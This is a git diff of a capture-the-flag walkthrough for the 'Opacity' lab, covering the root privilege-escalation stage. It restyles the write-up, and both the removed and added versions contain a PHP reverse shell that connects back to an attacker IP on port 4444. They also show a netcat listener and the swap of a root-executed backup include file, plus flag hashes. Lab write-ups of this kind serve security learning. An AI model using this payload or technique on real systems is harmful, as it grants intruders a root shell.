@@ -312,62 +312,88 @@ ssh sysadmin@ip
 6661b61b44d234d230d06bf5b3c075e2
 ```
 
-With user-level access secured, the foundation for full compromise was firmly in place.
+### Privilege Escalation to Root
 
-# Privilage Escaltion to root
+With user access secured, I moved on to reviewing scheduled or automated scripts owned by higher-privileged users.
 
-Check out script.php. It uses lib/backup.inc.php to backup the scripts folder. Also, backup.inc.php runs as root.
-<img>
-afte check ls -la we cant edit
-```
-sysadmin@ip-10-49-167-120:~/scripts$ cat script.php 
-<?php
+• Found a PHP script inside the `scripts` directory
+• Noticed it was calling `lib/backup.inc.php` to back up the scripts folder
+• Observed that the backup logic executed with root privileges
 
-//Backup of scripts sysadmin folder
-require_once('lib/backup.inc.php');
-zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
-echo 'Successful', PHP_EOL;
+```
+cat script.php
+```
+<img width="847" height="393" alt="image" src="https://github.com/user-attachments/assets/19477838-96ff-4473-82c8-d5f02f0d7fbf" />
 
-//Files scheduled removal
-$dir = "/var/www/html/cloud/images";
-if(file_exists($dir)){
-    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
-    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
-    foreach ( $ri as $file ) {
-        $file->isDir() ?  rmdir($file) : unlink($file);
-    }
-}
-?>
+Although the main script wasn’t writable, the included file immediately stood out.
+
+• Checked permissions on the `lib` directory
+• Confirmed `backup.inc.php` was owned by root
+
 ```
+ls -la lib/
 ```
-sysadmin@ip-10-49-167-120:~/scripts$ ls -la lib/
-total 128
--rw-r--r-- 1 root     root  967 Jul 26  2022 backup.inc.php
-```
-setup a netcat listner
+
+Despite the ownership, the file could be replaced indirectly.
+
+---
+
+### Abusing the Backup Script
+
+To prepare for escalation, I first set up a listener on my machine.
+
 ```
 nc -lnvp 4444
 ```
-move to tmp
+
+Next, I replaced the backup file with a malicious version.
+
+• Moved the original file out of the way
+• Copied it back into place under my control
+• Navigated to the target directory
+
 ```
 mv backup.inc.php /tmp
 cp /tmp/backup.inc.php ~/scripts/lib/backup.inc.php
 cd ~/scripts/lib/
 ```
-add this line to get reverse shell
+
+I then overwrote `backup.inc.php` with a simple PHP reverse shell payload.
+
 ```
-cat << 'EOF' >  backup.inc.php
+cat << 'EOF' > backup.inc.php
 <?php
-$sock=fsockopen("192.168.148.220",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+$sock=fsockopen("192.168.148.220",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
 EOF
 ```
 
-After couple of minute root shell have been poped up
-<img>
-<img width="530" height="229" alt="image" src="https://github.com/user-attachments/assets/98aef0ac-31a8-411f-ae30-0835eb6d3fbc" />
+---
 
-Root Flag.txt
+### Root Access
+
+After a short wait, the scheduled task executed the modified script.
+
+• Incoming connection received
+• Shell spawned with root privileges
+
+<img>
+<img>
+
+With root access confirmed, retrieving the final flag was straightforward.
+
 ```
 ac0d56f93202dd57dcb2498c739fd20e
 ```
+
+---
+
+### Conclusion
+
+Opacity was a solid lab that rewarded careful enumeration and patience rather than brute force. Each stage flowed naturally into the next, from web enumeration to file upload abuse, credential extraction, and finally a clean privilege escalation via a misconfigured backup script. It’s a great reminder that small oversights, when chained together, can lead to full system compromise.
+
+**Thanks for reading.**
+You can also find my walkthroughs on Medium: [https://medium.com/@deathesther](https://medium.com/@deathesther)
+
+<img width="1076" height="606" alt="image" src="https://github.com/user-attachments/assets/de616619-961f-4b53-be31-aae4d86c7a1c" />
